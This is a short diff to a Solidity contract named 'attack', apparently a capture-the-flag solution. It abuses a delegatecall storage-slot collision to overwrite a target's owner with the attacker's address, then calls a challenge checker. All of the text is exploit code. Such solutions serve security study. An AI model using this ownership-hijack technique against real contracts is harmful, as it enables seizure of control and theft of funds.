@@ -9,17 +9,21 @@ contract attack {
     address public timeZone1Library;
     address public timeZone2Library;
     address public owner;
+    Check public check;
+    TimeZone public timeZone;
 
     function setTime(uint _time) public {
         owner = address(_time);
     }
 
     constructor(address _check) public {
-        Check(_check).setFirstTime(uint256(uint160(address(this))));
+        check = Check(_check);
+        timeZone = check.timeZone();
+        timeZone.setFirstTime(uint256(uint160(address(this))));
     }
 
     function exp(address _check) public {
-        Check(_check).setFirstTime(uint256(uint160(address(this))));
-        Check(_check).isCompleted();
+        timeZone.setFirstTime(uint256(uint160(address(this))));
+        check.isCompleted();
     }
 }
